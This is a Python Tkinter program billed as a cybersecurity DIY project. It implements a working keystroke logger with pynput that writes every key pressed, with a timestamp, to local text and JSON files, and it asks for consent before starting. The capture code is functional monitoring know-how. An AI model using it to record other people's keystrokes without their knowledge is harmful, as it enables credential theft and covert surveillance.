import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Listener
import logging
import threading
import json
from datetime import datetime

#CONFIGURATION#

TEXT_LOG_FILE = "keylog.txt"
JSON_LOG_FILE = "keylog.json"

logging.basicConfig(
    filename=TEXT_LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s : %(message)s"
)

listener = None
is_logging = False
json_logs = []

#KEYLOGGER LOGIC#

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        key_value = key.char
    except AttributeError:
        key_value = str(key)

    # Text log
    logging.info(key_value)

    # JSON log
    json_logs.append({
        "timestamp": timestamp,
        "key_pressed": key_value
    })

    save_json_log()


def save_json_log():
    with open(JSON_LOG_FILE, "w") as file:
        json.dump(json_logs, file, indent=4)


def start_keylogger():
    global listener, is_logging

    if is_logging:
        return

    is_logging = True
    listener = Listener(on_press=on_press)
    listener.start()

    status_label.config(text="Status: Logging Started", fg="green")


def stop_keylogger():
    global listener, is_logging

    if not is_logging:
        return

    is_logging = False

    if listener:
        listener.stop()
        listener = None

    status_label.config(text="Status: Logging Stopped", fg="red")


#GUI FUNCTIONS#

def start_logging():
    consent = messagebox.askyesno(
        "User Consent Required",
        "This application records keystrokes for \n"
        "CYBER SECURITY purposes only.\n\n"
        "Do you want to continue?"
    )

    if consent:
        threading.Thread(target=start_keylogger, daemon=True).start()

def stop_logging():
    stop_keylogger()

def exit_app():
    stop_keylogger()
    root.destroy()


#GUI DESIGN#

root = tk.Tk()
root.title("Keylogger - Cyber Security DIY Project")
root.geometry("450x300")
root.resizable(False, False)

tk.Label(
    root,
    text="Keystroke Logger by Prathamesh",
    font=("Arial", 14, "bold")
).pack(pady=10)

tk.Label(
    root,
    text=(
        "Purpose: Cyber Security Awareness\n"
        "• Demonstrates keystroke logging behavior\n"
        "• Logs data in TEXT and JSON format\n"
        "• Helps in detection "
    ),
    justify="left"
).pack(pady=5)

status_label = tk.Label(
    root,
    text="Status: Not Running",
    fg="red",
    font=("Arial", 10, "bold")
)
status_label.pack(pady=10)

tk.Button(
    root,
    text="Start Keylogging",
    width=22,
    bg="#4CAF50",
    fg="white",
    command=start_logging
).pack(pady=5)

tk.Button(
    root,
    text="Stop Keylogging",
    width=22,
    bg="#F44336",
    fg="white",
    command=stop_logging
).pack(pady=5)

tk.Button(
    root,
    text="Exit",
    width=22,
    command=exit_app
).pack(pady=10)

root.protocol("WM_DELETE_WINDOW", exit_app)
root.mainloop()
